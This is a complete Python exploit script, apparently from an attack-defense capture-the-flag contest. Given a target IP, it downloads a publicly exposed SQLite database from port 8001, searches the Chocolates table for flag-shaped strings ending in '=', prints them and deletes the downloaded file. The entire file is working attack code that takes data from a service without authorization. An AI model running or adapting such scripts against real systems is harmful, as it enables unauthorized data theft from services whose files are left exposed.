#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys, re, requests
import sqlite3
import string, random, uuid, re, os

ip = sys.argv[1]
s = requests.Session()

def generator(size=12, chars=string.digits + string.ascii_letters):
    return ''.join(random.choice(chars) for _ in range(size))

name = generator()


db = s.get('http://{}:8001/data/choco.db'.format(ip),allow_redirects=True)
name = name + '.db'
open(name, 'wb').write(db.content)

print(name)
con = sqlite3.connect(name)
cur = con.cursor()
cur.execute("select Description from Chocolates WHERE Description LIKE '%=%' ORDER BY id DESC LIMIT 10")

rows = cur.fetchall()

for row in rows:
    print(re.findall('[A-Z0-9]{31}=',str(row)))
os.remove(name)
